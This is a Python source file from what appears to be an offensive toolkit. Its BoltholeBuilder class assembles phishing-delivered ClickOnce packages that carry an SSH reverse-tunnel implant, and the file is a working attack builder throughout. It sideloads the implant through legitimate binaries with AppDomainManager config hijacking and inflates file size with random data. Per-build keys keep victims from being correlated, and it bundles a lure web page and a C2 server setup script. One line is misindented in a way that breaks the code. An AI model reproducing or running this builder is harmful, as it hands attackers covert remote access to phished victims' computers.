"""
BoltholeBuilder — builds ClickOnce packages with the Bolthole SSH-tunnel payload.
"""
import base64
import json
import os
import re
import random
import string
import shutil
import subprocess
import tempfile
import traceback
import zipfile
from pathlib import Path
from string import Template
from tempfile import TemporaryDirectory

from .bolthole_models import BoltholePayload
from .bolthole_c2store import get_or_generate_keypair, load_keypair
from .logging import PerRequestLogger, GlobalLogger
from .misc import run_cmd_check_file
from .consts import (
    BUILD_DIR,
    BOLTHOLE_SRC_TEMPLATE_DIR,
    BOLTHOLE_BIN_TEMPLATE_DIR,
    BOLTHOLE_BUILD_CMD,
    BOLTHOLE_SIDELOAD_OPTIONS,
    DATA_CS_SIZE_IN_MB,
    PHISH_TEMPLATE_DIR,
    WEBSERVER_CONFIG_DIR,
    ALLOWED_PHISH_TEMPLATES,
    TZSYNC, PERFWATSON, SVCHUB, POWERSHELL,
)


class BoltholeBuilder:
    def __init__(self, buildid: str, payload: BoltholePayload):
        self.buildid = buildid
        self.build_dir = os.path.join(BUILD_DIR, buildid)
        self._temp_dir = TemporaryDirectory(delete=False)
        self.temp_dir = self._temp_dir.name
        self.payload = payload
        self.logger = PerRequestLogger(buildid)
        self.tgt_dll = os.path.join(
            self.temp_dir, "bin", "x64", "Release", f"{payload.name}.dll"
        )
        self.sideload_exe = None
        self._port_list = []
        self._ssh_user_key_name = f"{payload.ssh_user}_key"

    @property
    def _files_dir_name(self) -> str:
        p = self.payload.files_prefix
        return p[0].upper() + p[1:] + "Files"

    @property
    def _boltd_exe(self) -> str:
        return f"{self.payload.files_prefix}d.exe"

    @property
    def _boltcon_exe(self) -> str:
        return f"{self.payload.files_prefix}con.exe"

    @property
    def _bolt_key(self) -> str:
        # Named {prefix}d-hostkey (e.g. coolerd-hostkey) to prevent collision with
        # {ssh_user}_key (the outbound connection key) when files_prefix == ssh_user.
        return f"{self.payload.files_prefix}d-hostkey"

    @property
    def _boltd_config(self) -> str:
        return f"{self.payload.files_prefix}d-config"

    def _parse_tunnel_range(self) -> tuple:
        """Parse tunnel_port_range string into (start, end) ints. Raises on bad format."""
        r = self.payload.tunnel_port_range.strip()
        try:
            if '-' in r[1:]:
                s, e = r.split('-', 1)
                return int(s.strip()), int(e.strip())
            v = int(r)
            return v, v
        except ValueError as exc:
            raise ValueError(
                f"tunnel_port_range '{self.payload.tunnel_port_range}' is not a valid port or range "
                f"(expected e.g. '31332' or '31332-31345')"
            ) from exc

    def verify(self):
        if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", self.payload.name):
            raise Exception("Application name does not match required regex")

        if not 0 <= self.payload.inflate <= 500:
            raise Exception("inflate must be between 0 and 500")

        if self.payload.sideload.lower() not in BOLTHOLE_SIDELOAD_OPTIONS:
            raise Exception("Invalid sideload option")

        if not self.payload.ssh_host.strip():
            raise Exception("ssh_host cannot be empty")

        if not re.match(r'^[a-z_][a-z0-9_-]{0,31}$', self.payload.ssh_user):
            raise Exception("ssh_user must be a valid Linux username (lowercase letters, digits, _ and -, max 32 chars)")

        try:
            self._port_list = [
                int(p.strip()) for p in self.payload.ports.split(",") if p.strip()
            ]
        except ValueError as exc:
            raise Exception("ports must contain only integers") from exc

        if not self._port_list:
            raise Exception("ports cannot be empty")

        for p in self._port_list:
            if not 1 <= p <= 65535:
                raise Exception(f"Port {p} is out of valid range 1-65535")

        ts, te = self._parse_tunnel_range()
        if not (1 <= ts <= 65535 and 1 <= te <= 65535):
            raise Exception("tunnel_port_range contains an out-of-range port")
        if ts > te:
            raise Exception("tunnel_port_range start must be <= end")
        if te - ts > 63:
            raise Exception("tunnel_port_range too wide (max 64 ports)")

        if not 1 <= self.payload.socks_port <= 65535:
            raise Exception("socks_port out of valid range")

        priv, _ = load_keypair()
        if not priv:
            raise Exception(
                "No global outbound keypair found — save C2 config first via the UI "
                "so a keypair is generated before building"
            )

        self.logger.debug("Validated all Bolthole parameters")

    def copy_template_files(self):
        shutil.copytree(BOLTHOLE_SRC_TEMPLATE_DIR, self.temp_dir, dirs_exist_ok=True)
        boltfiles_dst = os.path.join(self.temp_dir, self._files_dir_name)
        os.makedirs(boltfiles_dst, exist_ok=True)
        shutil.copytree(BOLTHOLE_BIN_TEMPLATE_DIR, boltfiles_dst, dirs_exist_ok=True)
        for old, new in [
            ("boltd.exe", self._boltd_exe),
            ("boltcon.exe", self._boltcon_exe),
            ("bolt_key", self._bolt_key),
        ]:
            old_path = os.path.join(boltfiles_dst, old)
            new_path = os.path.join(boltfiles_dst, new)
            if os.path.exists(old_path) and old_path != new_path:
                os.rename(old_path, new_path)
        # Replace template icon if a custom one was supplied
        if self.payload.icon:
            icon_path = os.path.join(self.temp_dir, "icon.ico")
            with open(icon_path, "wb") as f:
                f.write(base64.b64decode(self.payload.icon))
            self.logger.debug("Replaced icon.ico with custom upload")
        self.logger.debug("Copied template files to %s", self.temp_dir)

    def _generate_keypair(self, suffix: str, key_type: str = "ecdsa", bits: int = 256) -> tuple[str, str]:
        """Generate a temporary SSH keypair, return (private, public) as strings."""
        tmp_keyfile = None
        try:
            with tempfile.NamedTemporaryFile(suffix=suffix, delete=False) as tmp:
                tmp_keyfile = tmp.name
            os.unlink(tmp_keyfile)  # ssh-keygen refuses to overwrite an existing file
            subprocess.run(
                ["ssh-keygen", "-t", key_type, "-b", str(bits), "-f", tmp_keyfile, "-N", ""],
                check=True,
                capture_output=True,
            )
            with open(tmp_keyfile, "r") as f:
                private_key = f.read()
            with open(tmp_keyfile + ".pub", "r") as f:
                public_key = f.read()
        finally:
            if tmp_keyfile and os.path.exists(tmp_keyfile):
                os.unlink(tmp_keyfile)
            pub = f"{tmp_keyfile}.pub" if tmp_keyfile else None
            if pub and os.path.exists(pub):
                os.unlink(pub)
        return private_key, public_key

    def generate_operator_keys(self):
        """Generate fresh keypairs per build.

        Operator keypair (ECDSA-256):
          Private key → build_dir/operator_key (downloaded by operator).
          Public key  → temp_dir/BoltFiles/authorized_keys (embedded in package).

        boltd host keypair (RSA-2048):
          Private key → temp_dir/BoltFiles/bolt_key (replaces static template copy).
          Unique per build so deployments can't be correlated by host fingerprint.
        """
        private_key, public_key = self._generate_keypair("_bolthole_opkey")

        operator_key_path = os.path.join(self.build_dir, "operator_key")
        with open(operator_key_path, "w") as f:
            f.write(private_key)
        os.chmod(operator_key_path, 0o600)
        self.logger.debug("Wrote operator private key to %s", operator_key_path)

        auth_keys_path = os.path.join(self.temp_dir, self._files_dir_name, "authorized_keys")
        with open(auth_keys_path, "w") as f:
            f.write(public_key)
            extra = self.payload.operator_pubkey.strip()
            if extra:
                f.write("\n" + extra + "\n")
        self.logger.debug("Wrote authorized_keys to %s", auth_keys_path)

        # Rotate boltd host key — overwrite the static template copy so each
        # deployment presents a unique fingerprint, preventing cross-target correlation.
        bolt_host_private, _ = self._generate_keypair("_bolthole_hostkey", key_type="rsa", bits=2048)
        bolt_key_path = os.path.join(self.temp_dir, self._files_dir_name, self._bolt_key)
        with open(bolt_key_path, "w", newline="\n") as f:
            f.write(bolt_host_private)
        os.chmod(bolt_key_path, 0o600)
        self.logger.debug("Rotated %s host key for build %s", self._bolt_key, self.buildid)

    def template_files(self):
        # Rename project files to match payload name
        for ext in ("csproj", "manifest", "application"):
            os.rename(
                os.path.join(self.temp_dir, f"project.{ext}"),
                os.path.join(self.temp_dir, f"{self.payload.name}.{ext}"),
            )

        # Template Program.cs
        program_cs = os.path.join(self.temp_dir, "Program.cs")
        with open(program_cs, "r") as f:
            content = f.read()

        port_array = ", ".join(str(p) for p in self._port_list)
        content = content.replace("REPLACE_SSH_HOST", self.payload.ssh_host)
        content = content.replace("REPLACE_USERNAME", self.payload.ssh_user)
        content = content.replace("REPLACE_PORT_ARRAY", port_array)
        ts, te = self._parse_tunnel_range()
        tunnel_port_array = ", ".join(str(p) for p in range(ts, te + 1))
content = content.replace("REPLACE_TUNNEL_PORT_ARRAY", tunnel_port_array)
        content = content.replace("REPLACE_BOLTD_LOCAL_PORT", str(ts))
        content = content.replace(
            "REPLACE_STARTUP_DELAY_MS", str(self.payload.startup_delay * 1000)
        )
        content = content.replace(
            "REPLACE_RECONNECT_DELAY_MS", str(self.payload.reconnect_delay * 1000)
        )
        content = content.replace("REPLACE_KEYFILE_NAME", self._ssh_user_key_name)
        content = content.replace("REPLACE_FILES_DIR", self._files_dir_name)
        content = content.replace("REPLACE_BOLTD_EXE", self._boltd_exe)
        content = content.replace("REPLACE_BOLT_KEY_FILE", self._bolt_key)
        content = content.replace("REPLACE_BOLTD_CONFIG", self._boltd_config)
        content = content.replace("REPLACE_BOLTCON_EXE", self._boltcon_exe)

        with open(program_cs, "w") as f:
            f.write(content)
        self.logger.debug("Templated Program.cs")

        # Write boltd-config
        ts, _ = self._parse_tunnel_range()
        boltd_config_path = os.path.join(self.temp_dir, self._files_dir_name, self._boltd_config)
        with open(boltd_config_path, "w") as f:
            f.write(f"Port {ts}\n")
            f.write("ListenAddress 127.0.0.1\n")
            f.write("PubkeyAuthentication yes\n")
            f.write("PasswordAuthentication no\n")
            f.write("IgnoreRhosts yes\n")
        self.logger.debug("Wrote boltd-config with port %d (range start)", ts)

        # Write the global outbound private key as {ssh_user}_key.
        # Always ensure a single trailing newline: Windows OpenSSH reports "invalid format" without it.
        key_path = os.path.join(self.temp_dir, self._files_dir_name, self._ssh_user_key_name)
        priv, _ = get_or_generate_keypair()
        normalized_outbound_key = priv.replace("\r\n", "\n").replace("\r", "\n").rstrip("\n") + "\n"
        with open(key_path, "w", newline="\n") as f:
            f.write(normalized_outbound_key)
        self.logger.debug("Wrote global outbound key as %s", self._ssh_user_key_name)

        # Generate Data.cs for .text section inflation
        data_cs_file = os.path.join(self.temp_dir, "Data.cs")
        func_name = "".join(random.choices(string.ascii_letters, k=16))
        with open(data_cs_file, "w") as f:
            f.write(f"""
                namespace {self.payload.name}
                {{
                    internal class Data
                    {{
                        private static readonly byte[] data = new byte[]
                        {{
                """)

            max_data_cs = int(DATA_CS_SIZE_IN_MB)
            data_cs_size = (
                self.payload.inflate
                if self.payload.inflate <= max_data_cs
                else max_data_cs
            )
            self.logger.debug(
                "Creating Data.cs with %d MB inflation", data_cs_size
            )
            for _ in range(int(data_cs_size * 1024 * 1024 / 32)):
                byte_str = (
                    str(list(os.urandom(32))).replace("[", "").replace("]", ",\n")
                )
                f.write(byte_str)

            f.write(f"""
                        }};

                        static unsafe void {func_name}()
                        {{
                            fixed (byte* ptr = data)
                            {{
                            }}
                        }}
                    }}
                }}
            """)
        self.logger.debug(
            "Generated Data.cs size: %d", os.stat(data_cs_file).st_size
        )

        # Generate training.data for embedded resource overflow inflation
        max_data_cs_outer = int(DATA_CS_SIZE_IN_MB)
        training_data_size = (
            1
            if self.payload.inflate <= max_data_cs_outer
            else (self.payload.inflate - max_data_cs_outer) * 1024 * 1024
        )
        training_data_file = os.path.join(self.temp_dir, "training.data")
        _chunk = 4 * 1024 * 1024
        remaining = training_data_size
        with open(training_data_file, "wb") as f:
            while remaining > 0:
                chunk_size = min(_chunk, remaining)
                f.write(os.urandom(chunk_size))
                remaining -= chunk_size
        self.logger.debug("Created training.data: %d bytes", training_data_size)

    def compile_artefacts(self):
        self.logger.debug("Building with: %s", BOLTHOLE_BUILD_CMD)
        curr_dir = os.getcwd()
        try:
            os.chdir(self.temp_dir)
            run_cmd_check_file(BOLTHOLE_BUILD_CMD, self.tgt_dll, self.logger)
        finally:
            os.chdir(curr_dir)

    def prepare_files_in_build_dir(self):
        sideload_key = self.payload.sideload.lower()
        if sideload_key == "tzsync":
            self.sideload_exe = TZSYNC
        elif sideload_key == "perfwatson2":
            self.sideload_exe = PERFWATSON
        elif sideload_key == "systemhost":
            self.sideload_exe = SVCHUB
        else:
            self.sideload_exe = POWERSHELL

        # Sideload binary (already has .deploy extension in templates/bin/)
        shutil.copy(self.sideload_exe.path, self.build_dir)

        # Compiled Bolthole DLL
        shutil.copy(
            self.tgt_dll,
            os.path.join(self.build_dir, f"{self.payload.name}.dll.deploy"),
        )

        # AppDomainManager config — BoltDomain is the type, name is the assembly
        config_src = os.path.join(BOLTHOLE_SRC_TEMPLATE_DIR, "project.exe.config.deploy")
        with open(config_src, "r") as f:
            config_contents = f.read().replace("REPLACEASSEMBLYNAME", self.payload.name)
        with open(
            os.path.join(self.build_dir, f"{self.sideload_exe.exe}.config.deploy"), "w"
        ) as f:
            f.write(config_contents)

        # {prefix}Files — copy everything from temp_dir/{prefix}Files/ with .deploy extension
        boltfiles_src = os.path.join(self.temp_dir, self._files_dir_name)
        boltfiles_dst = os.path.join(self.build_dir, self._files_dir_name)
        os.makedirs(boltfiles_dst, exist_ok=True)
        for fname in os.listdir(boltfiles_src):
            src_file = os.path.join(boltfiles_src, fname)
            if os.path.isfile(src_file):
                shutil.copy(src_file, os.path.join(boltfiles_dst, fname + ".deploy"))

        self.logger.debug("Populated build dir: DLL, sideload, config, %s", self._files_dir_name)

    def template_manifests(self):
        boltfiles_dst = os.path.join(self.build_dir, self._files_dir_name)

        def sz(path):
            return os.stat(path).st_size

        dll_deploy = os.path.join(self.build_dir, f"{self.payload.name}.dll.deploy")
        cfg_deploy = os.path.join(
            self.build_dir, f"{self.sideload_exe.exe}.config.deploy"
        )

        # Write assembly manifest
        manifest_src = os.path.join(BOLTHOLE_SRC_TEMPLATE_DIR, "project.manifest")
        with open(manifest_src, "r") as f:
            manifest_tmpl = f.read()

        manifest_path = os.path.join(
            self.build_dir, f"{self.payload.name}.manifest"
        )
        with open(manifest_path, "w") as f:
            f.write(
                Template(manifest_tmpl).safe_substitute(
                    clickonce_name=self.payload.name,
                    dll_size=sz(dll_deploy),
                    assembly_name=self.sideload_exe.name,
                    assembly_version=self.sideload_exe.version,
                    assembly_key=self.sideload_exe.key,
                    assembly_size=self.sideload_exe.size,
                    assembly_config_size=sz(cfg_deploy),
                    files_dir=self._files_dir_name,
                    boltd_exe=self._boltd_exe,
                    boltcon_exe=self._boltcon_exe,
                    bolt_key_file=self._bolt_key,
                    boltd_config=self._boltd_config,
                    boltd_size=sz(
                        os.path.join(boltfiles_dst, f"{self._boltd_exe}.deploy")
                    ),
                    boltcon_size=sz(
                        os.path.join(boltfiles_dst, f"{self._boltcon_exe}.deploy")
                    ),
                    libcrypto_size=sz(
                        os.path.join(boltfiles_dst, "libcrypto.dll.deploy")
                    ),
                    bolt_key_size=sz(
                        os.path.join(boltfiles_dst, f"{self._bolt_key}.deploy")
                    ),
                    boltd_config_size=sz(
                        os.path.join(boltfiles_dst, f"{self._boltd_config}.deploy")
                    ),
                    authorized_keys_size=sz(
                        os.path.join(boltfiles_dst, "authorized_keys.deploy")
                    ),
                    ssh_user_key_name=self._ssh_user_key_name,
                    ssh_user_key_size=sz(
                        os.path.join(
                            boltfiles_dst, f"{self._ssh_user_key_name}.deploy"
                        )
                    ),
                )
            )
        self.logger.debug("Wrote manifest: %s", manifest_path)

        # Write deployment manifest (.application)
        app_src = os.path.join(BOLTHOLE_SRC_TEMPLATE_DIR, "project.application")
        with open(app_src, "r") as f:
            app_tmpl = f.read()

        # Construct the canonical deploymentProvider URL.  The zip places all ClickOnce
        # files under clickonce/, so the operator's base hosting URL must have that path
        # appended.  Accept either a bare base URL ("https://host.com") or a full path
        # already containing clickonce/ — detect the latter and use as-is.
        base_url = self.payload.provider_url.rstrip('/')
        if base_url:
            if f"/clickonce/{self.payload.name}.application" in base_url:
                canonical_url = base_url
            else:
                canonical_url = f"{base_url}/clickonce/{self.payload.name}.application"
        else:
            canonical_url = ""

        app_path = os.path.join(self.build_dir, f"{self.payload.name}.application")
        with open(app_path, "w") as f:
            f.write(
                Template(app_tmpl).safe_substitute(
                    clickonce_name=self.payload.name,
                    version=self.payload.version,
                    provider_url=canonical_url,
                    manifest_size=sz(manifest_path),
                    publisher=self.payload.publisher,
                    description=self.payload.description or self.payload.name,
                )
            )
        self.logger.debug("Wrote application: %s", app_path)

    def zip_package(self):
        """Package build artifacts.

        Zip layout:
          index.html          ← phishing lure page
          web.config          ┐
          .htaccess           │ server configs at root
          nginx-mime.conf     │
          Caddyfile-mime      ┘
          clickonce/          ← all ClickOnce / deploy files
            *.application
            *.manifest
            *.deploy (flat + BoltFiles/ subfolder)
        """
        target_extensions = (".deploy", ".manifest", ".application")
        source_path = Path(self.build_dir)
        matching_files = []
        for ext in target_extensions:
            matching_files.extend(source_path.glob(f"**/*{ext}"))

        if not matching_files:
            raise Exception("No files to zip found")

        output_zip = os.path.join(self.build_dir, f"{self.payload.name}.zip")
        with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
            # ClickOnce deployment files → clickonce/ subfolder
            for file_path in matching_files:
                if file_path.is_file():
                    relative_path = file_path.relative_to(source_path)
                    zf.write(file_path, os.path.join("clickonce", str(relative_path)))
                    os.remove(file_path)
                    self.logger.debug("Zipped clickonce/%s", relative_path)

            # Phish / lure page → root as index.html (remove from build_dir so it doesn't shadow directory listing)
            phish_path = os.path.join(self.build_dir, "phish.html")
            if os.path.isfile(phish_path):
                zf.write(phish_path, "index.html")
                os.remove(phish_path)
                self.logger.debug("Zipped phish.html → index.html")

            # Web server MIME configs → root
            if os.path.isdir(WEBSERVER_CONFIG_DIR):
                for fname in os.listdir(WEBSERVER_CONFIG_DIR):
                    src = os.path.join(WEBSERVER_CONFIG_DIR, fname)
                    if os.path.isfile(src):
                        zf.write(src, fname)
                        self.logger.debug("Added server config: %s", fname)

        self.logger.info("Created %s with %d ClickOnce files", output_zip, len(matching_files))

    def generate_phish_page(self):
        template_name = self.payload.phish_template
        if template_name not in ALLOWED_PHISH_TEMPLATES:
            self.logger.warning(
                "Unknown phish template '%s', falling back to it_portal", template_name
            )
            template_name = "it_portal"
        template_path = os.path.join(PHISH_TEMPLATE_DIR, f"{template_name}.html")
        try:
            with open(template_path, "r", encoding="utf-8") as f:
                html = f.read()
        except FileNotFoundError:
            self.logger.warning("Phish template file not found: %s, using fallback", template_path)
            fallback = os.path.join(PHISH_TEMPLATE_DIR, "it_portal.html")
            try:
                with open(fallback, "r", encoding="utf-8") as f:
                    html = f.read()
            except FileNotFoundError as exc:
                raise FileNotFoundError(
                    f"Primary phish template '{template_name}' and fallback 'it_portal' both missing"
                    f" — check {PHISH_TEMPLATE_DIR} is mounted"
                ) from exc
        clickonce_link = f"clickonce/{self.payload.name}.application"
        html = html.replace("{{provider_url}}", clickonce_link)
        phish_path = os.path.join(self.build_dir, "phish.html")
        with open(phish_path, "w", encoding="utf-8") as f:
            f.write(html)
        self.logger.debug("Wrote phish.html using template '%s'", template_name)

    def generate_c2_setup(self):
        ports_ufw = " ".join(str(p) for p in self._port_list)
        ports_list_str = ", ".join(str(p) for p in self._port_list)
        ts, te = self._parse_tunnel_range()
        tunnel_range_str = f"{ts}-{te}" if ts != te else str(ts)

        _, pub = load_keypair()
        c2_public_key = pub.strip() if pub else "# PASTE YOUR OUTBOUND SSH PUBLIC KEY HERE"
        self.logger.debug("Using global outbound public key for c2_setup.sh")

        script = f"""#!/usr/bin/env bash
# Bolthole C2 Setup Script
# ssh_host     : {self.payload.ssh_host}
# ssh_user     : {self.payload.ssh_user}
# ports        : {ports_list_str}
# tunnel_range : {tunnel_range_str}
# socks5       : {self.payload.socks_port}
set -e

SSH_USER="{self.payload.ssh_user}"

echo "[*] Creating user $SSH_USER (nologin shell) ..."
id "$SSH_USER" &>/dev/null || useradd -m -s /usr/sbin/nologin "$SSH_USER"

echo "[*] Configuring authorized_keys for $SSH_USER ..."
mkdir -p /home/$SSH_USER/.ssh
chmod 700 /home/$SSH_USER/.ssh
cat >> /home/$SSH_USER/.ssh/authorized_keys << 'PUBKEY'
{c2_public_key}
PUBKEY
chmod 600 /home/$SSH_USER/.ssh/authorized_keys
chown -R "$SSH_USER:$SSH_USER" /home/$SSH_USER/.ssh

echo "[*] Updating sshd_config ..."
grep -qxF 'AllowTcpForwarding yes' /etc/ssh/sshd_config || \\
    echo 'AllowTcpForwarding yes' >> /etc/ssh/sshd_config
grep -qxF 'GatewayPorts yes'       /etc/ssh/sshd_config || \\
    echo 'GatewayPorts yes'       >> /etc/ssh/sshd_config

echo "[*] Adding extra SSH listen ports ({ports_list_str}) ..."
# Anchor Port 22 explicitly first — adding any Port directive makes sshd stop
# listening on the implicit default 22, so we must preserve it.
grep -qxF "Port 22" /etc/ssh/sshd_config || \\
    echo "Port 22" >> /etc/ssh/sshd_config
for PORT in {ports_ufw}; do
    [ "$PORT" -eq 22 ] && continue
    grep -qxF "Port $PORT" /etc/ssh/sshd_config || \\
        echo "Port $PORT" >> /etc/ssh/sshd_config
done

echo "[*] Restarting sshd ..."
service ssh restart

echo "[*] Opening firewall ports ({ports_list_str}) ..."
if which ufw &>/dev/null; then
    for PORT in {ports_ufw}; do
        ufw allow "$PORT"/tcp
    done
    ufw reload
fi

echo "[+] Done. When a target connects, read the operator port from the C2 auth log:"
echo "    journalctl -u ssh | grep 'Invalid user'"
echo "    Format: Invalid user <win-user>.<machine>.p<PORT> from ..."
echo "    The .p<PORT> suffix is the dynamic tunnel port — use it to connect:"
echo "    ssh -i operator_key -p <PORT> <win-user>@localhost"
"""
        setup_path = os.path.join(self.build_dir, "c2_setup.sh")
        with open(setup_path, "w") as f:
            f.write(script)
        self.logger.debug("Wrote c2_setup.sh")


def bolthole_build_func(buildid: str, payload: BoltholePayload):
    """Background task: orchestrate the full Bolthole build pipeline."""
    builder = None
    try:
        builder = BoltholeBuilder(buildid, payload)
        builder.logger.debug("%s", payload)

        if not os.path.exists(BOLTHOLE_SRC_TEMPLATE_DIR):
            builder.logger.error(
                "Bolthole template dir %s not found", BOLTHOLE_SRC_TEMPLATE_DIR
            )
            raise FileNotFoundError(
                f"Bolthole template dir {BOLTHOLE_SRC_TEMPLATE_DIR} not found"
            )

        builder.verify()
        builder.copy_template_files()
        builder.generate_operator_keys()
        builder.template_files()
        builder.compile_artefacts()
        builder.prepare_files_in_build_dir()
        builder.template_manifests()
        builder.generate_phish_page()   # must run before zip_package (phish.html goes in zip)
        builder.zip_package()
        builder.generate_c2_setup()

        meta_path = os.path.join(builder.build_dir, "build-meta.json")
        with open(meta_path, "w") as f:
            json.dump({
                "type": "bolthole",
                "name": payload.name,
                "ssh_host": payload.ssh_host,
                "ssh_user": payload.ssh_user,
                "tunnel_port_range": payload.tunnel_port_range,
                "socks_port": payload.socks_port,
            }, f)

        builder.logger.info("Build complete")

    except Exception as exc:  # pylint: disable=broad-except
        GlobalLogger.error("Bolthole build exception: %s", exc)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
        if builder is not None:
            builder.logger.error("Build failed: %s", exc)
    finally:
        if builder is not None and builder._temp_dir is not None:
            try:
                builder._temp_dir.cleanup()
            except Exception:  # pylint: disable=broad-except
                pass
